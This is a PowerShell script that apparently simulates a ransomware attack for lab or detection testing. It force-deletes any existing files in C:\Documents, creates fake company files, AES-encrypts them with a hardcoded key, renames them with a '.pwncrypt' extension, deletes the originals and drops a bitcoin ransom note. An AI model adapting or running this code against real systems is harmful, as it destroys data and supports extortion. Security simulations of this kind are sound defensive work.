# Define the Public Desktop path and new Documents folder path
$documentsFolder = "C:\Documents"

# Create the Documents folder if it doesn't exist
if (-not (Test-Path -Path $documentsFolder)) {
    New-Item -Path $documentsFolder -ItemType Directory
}

# Clear the Documents folder if it already contains files
Get-ChildItem -Path $documentsFolder -File | ForEach-Object {
    Remove-Item $_.FullName -Force
}

# Define encryption key and IV (Initialization Vector) for AES
$key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
$iv = [byte[]](1..16) # IV should be 16 bytes for AES

# Function to encrypt text using AES
function Encrypt-Text($plainText, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)

    $aes.Dispose()
    return $encryptedBytes
}

# Fake company information (You can adjust these as needed)
$fakeFiles = @{
    "EmployeeRecords.txt" = "John Doe, ID: 12345, Role: Manager`nJane Smith, ID: 54321, Role: Engineer";
    "ProjectList.txt"     = "Project X - Deadline: 2024-12-31`nProject Y - Deadline: 2024-10-15";
    "CompanyFinancials.txt" = "Total Revenue: $10,000,000`nNet Profit: $1,000,000"
}

# Create fake text files in the Documents folder, encrypt them, then delete the originals
foreach ($file in $fakeFiles.Keys) {
    $filePath = Join-Path $documentsFolder $file

    # Write the fake company information to the text file
    $fakeContent = $fakeFiles[$file]
    Set-Content -Path $filePath -Value $fakeContent

    # Encrypt the file content
    $encryptedContent = Encrypt-Text $fakeContent $key $iv

    # Get the current time (Epoch time)
    $epochTime = [int][double]::Parse((Get-Date -UFormat %s))

    # Define the path for the encrypted file with .pwncrypt extension
    $encryptedFilePath = [System.IO.Path]::ChangeExtension($filePath, "$($epochTime).txt.pwncrypt")

    # Write the encrypted content to the new file
    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)

    # Delete the original unencrypted file
    Remove-Item -Path $filePath
}

# Write the decryption instructions in the Documents folder
"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath "$($documentsFolder)\decryption-instructions.txt" -Force 
 
